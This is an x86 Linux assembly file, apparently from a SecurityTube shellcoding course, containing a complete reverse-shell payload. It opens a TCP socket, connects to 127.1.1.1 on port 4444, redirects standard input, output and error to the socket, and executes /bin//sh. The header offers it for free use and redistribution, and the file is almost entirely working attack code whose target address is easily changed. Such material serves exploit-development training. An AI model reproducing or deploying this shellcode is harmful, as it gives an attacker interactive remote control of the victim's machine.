; Filename: rev_shell.nasm
; Author: Rob W
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: Reverse shell written in Linux x86 assembly. Default IP address is 127.1.1.1 and default port is 4444
; Your are free to use and redistribute this code as you wish

global _start			

section .text
_start:

	; int socket(int domain=2, int type=1, int protocol=0)
	; first we create our socket using the socketcall - socket


	xor eax, eax ;zero out register
	xor edx, edx
	mov al, 102 ; this is the syscall number for socketcall
	mov bl, 1 ; this is the socketcall type (sys_socket)

	; now we push the arguments onto the stack in reverse order

	push edx ; pushing zero onto the stack as this is the protocol number
	push 1 ; pushing 1 for SOCK_STREAM (type)
	push 2 ; pushing 2 for AF_INET (domain)

	mov ecx, esp ; make a pointer to our args
	int 0x80

	xor edi, edi ; clear our destination
	xchg edi, eax ; store the socket into edi


	xor eax, eax ; clear reg
	xor edx, edx ; clear reg
	push edx ; push zeroes onto the stack
	push 0x0101017f ; push ip address 127.1.1.1 (0x7f010101)
	push word 0x5c11 ; push port (port 4444)

	push word 2 ; push AF_INET
	mov ecx, esp ; save stack pointer
	push 16 ; addrlen
	push ecx ; pointer to argument struct
	push edi ; push socketfd

	mov al, 102 ; socketcall syscall
	mov bl, 3 ; socketcall type = 3 (sys_connect)
	mov ecx, esp ;save pointer to our arguments
	int 0x80

	xor eax, eax ;clearing our registers again
	xor ebx, ebx
	xor ecx, ecx
	
	mov cl, 2 ; setting up ecx for our dup2 calls
	mov ebx, edi ;our socket needs to be in ebx for dup2

loop:
	mov al, 63 ;syscall for dup2
	int 0x80
	dec ecx ;decrease ecx to point to the next fd
	jns loop ;jump back to the beginning unless ecx is a negative

	xor eax, eax ; clearing out reg
	push eax ;pushing nulls to the stack
	push 0x68732f2f ;push hs//
	push 0x6e69622f ;push nibs/
	mov ebx, esp ; save pointer to our args to ebx
	push eax ;push more nulls
	mov edx, esp ; save pointer to edx
	push ebx ;push arg pointer to stack
	mov ecx, esp ;save pointer to all our data

	mov al, 11 ;syscall for execve
	int 0x80 ;get shell
